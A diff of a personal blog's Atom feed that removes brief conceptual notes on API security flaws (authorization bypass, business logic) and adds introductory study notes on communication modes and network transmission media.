-</blockquote>]]></content><author><name>Prashant Dangi</name></author><summary type="html"><![CDATA[Recursion Recursion Tree Method &lt;/br&gt; Master Method]]></summary></entry><entry><title type="html">Hacking API’s by @corey j. ball</title><link href="http://localhost:4000/API-Testing/" rel="alternate" type="text/html" title="Hacking API’s by @corey j. ball" /><published>2024-02-27T00:00:00+05:30</published><updated>2024-02-27T00:00:00+05:30</updated><id>http://localhost:4000/API-Testing</id><content type="html" xml:base="http://localhost:4000/API-Testing/"><![CDATA[<h2 id="api-testing">API Testing</h2>
+<h3 id="simplex">Simplex</h3>
+<ul>
+  <li>One-way communication</li>
+  <li>Example: TV broadcasting</li>
+</ul>
 
-<p>API testing requires new skills, tools and new approaches</p>
+<h3 id="half-duplex">Half-Duplex</h3>
+<ul>
+  <li>Two-way communication, but not simultaneous</li>
+  <li>Example: Walkie-talkies</li>
+</ul>
 
-<h2 id="bussiness-logic-flaws">Bussiness Logic Flaws</h2>
+<h3 id="full-duplex">Full-Duplex</h3>
+<ul>
+  <li>Simultaneous two-way communication</li>
+  <li>Example: Phone calls</li>
+</ul>
 
-<p>Manipulating the legitimate data, workflows and functionality of an API</p>
+<h2 id="transmission-media">Transmission Media</h2>
 
+<h3 id="guided-media">Guided Media</h3>
+
+<h4 id="coaxial-cable">Coaxial Cable</h4>
 <ol>
-  <li>Misusing HTML Elements and other client side code</li>
-  <li>Authorization Bypass &lt;/br&gt;
-Broken object level authentication(BOLA) is #1 OWASP API Security
+  <li><strong>Baseband</strong>
     <ul>
-      <li>lateral movement : accessing data of another account at the same privilage level</li>
-      <li>Privilage Escalation : Accessing data that the current privilage level isn’t supposed to have acces to &lt;/br&gt;
-(Strong authorization and authentication protocols - such as oAuth or OpenID - should be implemented to prevent authorization bypass and protect your systems against this attack vector.)</li>
+      <li>Digital transmission</li>
+      <li>Single channel communication</li>
     </ul>
   </li>
-  <li>Failing to handle unconventional User Input(Fuzzing random input)</li>
-  <li>Domain-Specific Flaws : API management tools analystics and reporting capabilities to identify and analyze usage patters</li>
+  <li><strong>Broadband</strong>
+    <ul>
+      <li>Analog transmission</li>
+      <li>Multiple channel support</li>
+    </ul>
+  </li>
 </ol>
 
-<p><a href="https://github.com/0xd4ngi/Hacking-APIs-Breaking-Web-Application-P-Breaking-Web-Application-Programming-Interfaces/blob/main/Corey%20Ball%20-%20Hacking%20APIs-No%20Starch%20Press%20(2022).pdf">Hacking API’s</a></p>]]></content><author><name>Prashant Dangi</name></author><summary type="html"><![CDATA[API Testing]]></summary></entry></feed>
+<h4 id="fiber-optics">Fiber Optics</h4>
+<ul>
+  <li>High-speed data transmission</li>
+  <li>Immune to electromagnetic interference</li>
+  <li>Long-distance communication</li>
+</ul>
+
+<h4 id="twisted-pair">Twisted Pair</h4>
+<ol>
+  <li><strong>Unshielded (UTP)</strong>
+    <ul>
+      <li>Common in LANs</li>
+      <li>Cost-effective solution</li>
+    </ul>
+  </li>
+  <li><strong>Shielded (STP)</strong>
+    <ul>
+      <li>Better noise protection</li>
+      <li>Used in noisy environments</li>
+    </ul>
+  </li>
+</ol>]]></content><author><name>Prashant Dangi</name></author><category term="Computers" /><category term="Programming" /><summary type="html"><![CDATA[Fundamental Algorithms]]></summary></entry></feed>
